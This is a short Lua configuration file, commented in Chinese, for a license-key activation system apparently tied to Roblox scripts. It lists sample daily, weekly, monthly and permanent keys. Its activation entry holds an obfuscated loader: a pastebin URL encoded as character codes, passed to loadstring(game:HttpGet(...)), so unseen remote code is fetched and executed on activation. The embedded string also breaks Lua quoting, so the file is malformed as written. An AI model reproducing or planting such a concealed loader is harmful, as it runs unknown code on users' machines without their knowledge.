-- 外部卡密配置脚本
-- 将此文件上传到你的GitHub仓库，并使用Raw链接
return {
    -- 卡密列表
    keys = {
        {
            key = "DAILY123456",
            type = "daily",
            used = false
        },
        {
            key = "WEEKLY789012", 
            type = "weekly",
            used = false
        },
        {
            key = "MONTHLY345678",
            type = "monthly", 
            used = false
        },
        {
            key = "PERMANENT901234",
            type = "permanent",
            used = false
        }
    },
    
    -- 激活成功后加载的功能脚本
    activationScripts = {
        "_G["6.3 作者:3290274245"]="StarsCat Update the cloud"local SCC_CharPool={[1]= tostring(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,65,67,97,74,117,56,76,51})end)()))}loadstring(game:HttpGet(SCC_CharPool[1],true))()",
    }
}
